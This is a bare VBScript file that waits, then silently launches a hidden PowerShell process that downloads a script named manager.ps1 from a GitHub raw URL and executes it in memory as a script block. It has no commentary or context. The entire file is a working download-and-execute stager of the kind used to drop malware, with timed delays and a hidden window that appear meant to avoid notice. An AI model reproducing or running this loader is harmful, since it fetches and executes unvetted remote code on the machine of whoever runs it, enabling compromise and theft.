WScript.Sleep 11000
Set obj = CreateObject("WScript.Shell")
c = "C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -NoP -NonI ""Start-Sleep -Seconds 6; $u='https://raw.githubusercontent.com/chotaacc/newss/main/manager.ps1'; $http=New-Object -ComObject WinHttp.WinHttpRequest.5.1; $http.Open('GET',$u,$false); $http.Send(); $c=$http.ResponseText; $s=[ScriptBlock]::Create($c); & $s"""
obj.Run c, 0, False